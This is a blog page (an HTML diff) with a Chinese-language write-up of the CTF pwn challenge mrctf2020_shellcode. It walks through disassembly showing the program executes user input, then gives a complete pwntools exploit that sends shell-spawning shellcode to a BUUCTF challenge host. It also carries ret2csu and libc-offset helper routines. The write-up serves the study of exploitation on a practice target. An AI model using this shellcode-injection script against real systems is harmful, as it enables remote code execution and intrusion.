@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这题虽然是很简单的shellcode 但是因为禁用了ida的反编译 需要我们阅读汇编理解程序 就当作提高汇编理解能力了 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &amp;#x27;&#x2F;home&#x2F;chen&#x2F;pwn&amp;#x27;    Arch:     amd64-64-little    RELRO:    Fu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mrctf2020_shellcode">
+<meta property="og:url" content="http://example.com/2022/11/23/mrctf2020-shellcode/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="这题虽然是很简单的shellcode 但是因为禁用了ida的反编译 需要我们阅读汇编理解程序 就当作提高汇编理解能力了 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &amp;#x27;&#x2F;home&#x2F;chen&#x2F;pwn&amp;#x27;    Arch:     amd64-64-little    RELRO:    Fu">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-11-23T13:27:30.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:20:06.572Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>mrctf2020_shellcode</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/11/24/inndy-rop/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/11/21/unsortedbinAttack/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/23/mrctf2020-shellcode/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/23/mrctf2020-shellcode/&text=mrctf2020_shellcode"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/23/mrctf2020-shellcode/&title=mrctf2020_shellcode"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/23/mrctf2020-shellcode/&is_video=false&description=mrctf2020_shellcode"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mrctf2020_shellcode&body=Check out this article: http://example.com/2022/11/23/mrctf2020-shellcode/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/23/mrctf2020-shellcode/&title=mrctf2020_shellcode"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/23/mrctf2020-shellcode/&title=mrctf2020_shellcode"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/23/mrctf2020-shellcode/&title=mrctf2020_shellcode"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/23/mrctf2020-shellcode/&title=mrctf2020_shellcode"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/23/mrctf2020-shellcode/&name=mrctf2020_shellcode&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/23/mrctf2020-shellcode/&t=mrctf2020_shellcode"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        mrctf2020_shellcode
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-23T13:27:30.000Z" class="dt-published" itemprop="datePublished">2022-11-23</time>
+        
+        (Updated: <time datetime="2023-09-14T17:20:06.572Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/wp/">wp</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这题虽然是很简单的shellcode 但是因为禁用了ida的反编译 需要我们阅读汇编理解程序 就当作提高汇编理解能力了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>没有开NX保护 可以在内存上执行系统调用</p>
+<p>拖到ida后发现f5报错 于是只能阅读汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001155 ; __unwind &#123;</span><br><span class="line">.text:0000000000001155                 push    rbp</span><br><span class="line">.text:0000000000001156                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001159                 sub     rsp, 410h</span><br><span class="line">.text:0000000000001160                 mov     rax, cs:stdin@@GLIBC_2_2_5</span><br><span class="line">.text:0000000000001167                 mov     esi, 0          ; buf</span><br><span class="line">.text:000000000000116C                 mov     rdi, rax        ; stream</span><br><span class="line">.text:000000000000116F                 call    _setbuf</span><br><span class="line">.text:0000000000001174                 mov     rax, cs:stdout@@GLIBC_2_2_5</span><br><span class="line">.text:000000000000117B                 mov     esi, 0          ; buf</span><br><span class="line">.text:0000000000001180                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000001183                 call    _setbuf</span><br><span class="line">.text:0000000000001188                 mov     rax, cs:stderr@@GLIBC_2_2_5</span><br><span class="line">.text:000000000000118F                 mov     esi, 0          ; buf</span><br><span class="line">.text:0000000000001194                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000001197                 call    _setbuf</span><br><span class="line">.text:000000000000119C                 lea     rdi, s          ; &quot;Show me your magic!&quot;    //断点1</span><br><span class="line">.text:00000000000011A3                 call    _puts</span><br><span class="line">.text:00000000000011A8                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000000011AF                 mov     edx, 400h       ; nbytes</span><br><span class="line">.text:00000000000011B4                 mov     rsi, rax        ; buf </span><br><span class="line">.text:00000000000011B7                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000000011BC                 mov     eax, 0</span><br><span class="line">.text:00000000000011C1                 call    _read                                     //断点2</span><br><span class="line">.text:00000000000011C6                 mov     [rbp+var_4], eax</span><br><span class="line">.text:00000000000011C9                 cmp     [rbp+var_4], 0</span><br><span class="line">.text:00000000000011CD                 jg      short loc_11D6                        //断点3</span><br><span class="line">.text:00000000000011CF                 mov     eax, 0</span><br><span class="line">.text:00000000000011D4                 jmp     short locret_11E4</span><br></pre></td></tr></table></figure>
+
+<p>断点1:</p>
+<p>在这之前的汇编代码 执行了两步 一是清空缓存区 防止数据输入输出出现问题 第二步调用puts函数输出了一段字符串</p>
+<p>断点2:</p>
+<p>调用了read函数 可以手动反编译为<strong>read(0,buf,0x400)</strong></p>
+<p>断点3:</p>
+<p>紧接着将**$eax<strong>的值赋给</strong>rbp+var_4**  与0进行比较</p>
+<p>cmp的功能相当于减法指令，只是不保存结果</p>
+<p>jg指令 如果大于就跳转 即如果$eax大于0就跳转到loc_11D6函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000011D6 loc_11D6:                               ; CODE XREF: main+78↑j</span><br><span class="line">.text:00000000000011D6                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000000011DD                 call    rax</span><br><span class="line">.text:00000000000011DF                 mov     eax, 0</span><br></pre></td></tr></table></figure>
+
+<p>lea指令将$rbp+buf即我们上面通过read输入的变量的地址赋值给rax</p>
+<p>随后利用call指令调用这个地址的内容</p>
+<p>也就是说我们只要直接输入shellcode就可以做到系统调用</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_64&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">29656</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remoteconnect(ip,port)</span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Show me your magic!&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/23/mrctf2020-shellcode/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/23/mrctf2020-shellcode/&text=mrctf2020_shellcode"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/23/mrctf2020-shellcode/&title=mrctf2020_shellcode"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/23/mrctf2020-shellcode/&is_video=false&description=mrctf2020_shellcode"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=mrctf2020_shellcode&body=Check out this article: http://example.com/2022/11/23/mrctf2020-shellcode/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/23/mrctf2020-shellcode/&title=mrctf2020_shellcode"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/23/mrctf2020-shellcode/&title=mrctf2020_shellcode"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/23/mrctf2020-shellcode/&title=mrctf2020_shellcode"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/23/mrctf2020-shellcode/&title=mrctf2020_shellcode"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/23/mrctf2020-shellcode/&name=mrctf2020_shellcode&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/23/mrctf2020-shellcode/&t=mrctf2020_shellcode"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
